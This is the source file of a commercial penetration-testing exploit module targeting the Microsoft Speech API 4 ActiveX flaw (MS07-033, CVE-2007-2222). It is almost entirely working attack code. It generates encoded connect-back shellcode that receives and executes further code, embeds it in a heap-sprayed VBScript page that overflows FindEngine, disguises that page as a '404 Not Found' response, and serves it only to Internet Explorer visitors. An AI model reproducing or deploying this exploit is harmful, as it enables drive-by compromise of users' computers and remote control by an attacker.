#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from encoder import xorencoder, nibble_encoder
from shellcode import shellcodeGenerator, win32shell 
import binascii

NAME="Microsoft Speech API 4v (MS07-033)"
DESCRIPTION="Misdesign in a component of Microsoft Speech API 4 allows for arbitrary code execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"] = "CVE-2007-2222"
DOCUMENTATION["CVE URL"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2222"
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["MSRC"] = "http://www.microsoft.com/technet/security/Bulletin/MS07-033.mspx"
DOCUMENTATION["Date public"] = "6/12/2007"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "98","ME","2000","XP","2003" ]
PROPERTY['MSADV'] = "MS07-033"
PROPERTY['DELIVERY']='HTTP'

NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:speech -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

DEBUGNOTES="""
It's a standard bof, but the EIP it's overwritten using a utf8 value,
so "%01%12" will be 0x00120001.

"code" it's the var that has the shellcode, padded with tons of NOPs
to fill the stack, so we have NOPs at 0x00120001.

Besides that, this string has some ugly badchars, like \x80 (used for
the XOR byte ptr ds:[edi], KEY). xorencoder can now handle this transparently.
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]

        self.badstring="\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"
        self.setVersions()
        self.version=1
        self.name=NAME
        self.filename="speech.html"
        self.listenerArgsDict["fromcreatethread"]=1
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        sc=shellcodeGenerator.win32()                                                                                        
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect",{"port":self.callback.port,"ipaddress":self.callback.ip})                                                              
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread",None)

        #sc.addAttr("SmallRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF                                                     
        #sc.addAttr("UseWS2Ordinal",None)                                                                                     
        rawshellcode=sc.get()
        
        print "[!] RAW Shellcode len: %d bytes" % len(rawshellcode)
        
        #first encode to nibble
        enc = nibble_encoder.intel_nibbleencoder()
        bad = ""
        for i in range(ord('A'),ord('Z')+1):
            #for a-z inclusive, these are badchars
            bad+=chr(i)
        enc.setbadstring(bad)
        rawshellcode = enc.encode(rawshellcode)
        
        print "[!] Nibble Encoded Shellcode len: %d bytes" % len(rawshellcode)
        
        #the do a xor enconding using the real badstring
        encoder = xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        encoder.find_key(rawshellcode)
        self.shellcode = encoder.encode(rawshellcode)
                
        print "[!] Shellcode len: %d bytes" % len(self.shellcode)
        
        if not len(self.shellcode):
            return None

        return self.shellcode
   
    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
        
    def makefile(self):
        """Makes the actual bad html file to trigger the object spoofing"""
        if not self.createShellcode():
            return None
        
        html="""
        <html>
        <object id='speech' classid='clsid:EEE78591-FE22-11D0-8BEF-0060081841DE'></OBJECT>
        <script language="VBScript">
        on error resume next
        """
        
        html += "code = string(" + str(71000 - len(self.shellcode)) + ",unescape(\"%90\")) + unescape(\""
        tmp = binascii.b2a_hex(self.shellcode)
        for x in range(0,len(tmp),2):
            html += "%" + tmp[x:x+2]
        html += "\")\r\n"
        html += """speech.FindEngine 0, 0, 0, code, string(888,unescape("A")) + unescape("%FF%13") + unescape("%01%12") + unescape("%FF%13"), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        </script>
        <head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        The requested URL / was not found on this server.<p>
        <hr>
        </body>
        
        </html>
        """
            
        return html
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE")==0:
            #still need to determine if it's pretending to be IE by spoofing User-Agent string
            self.log("Non IE browser connected - returning None")
            return None,None
        
        
        #send the exploit
        self.log("Sending the Speech attack html file")
        sploitstring=self.makefile()
        
        if not sploitstring:
            return None,None
        
        b.setBody(sploitstring)

        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
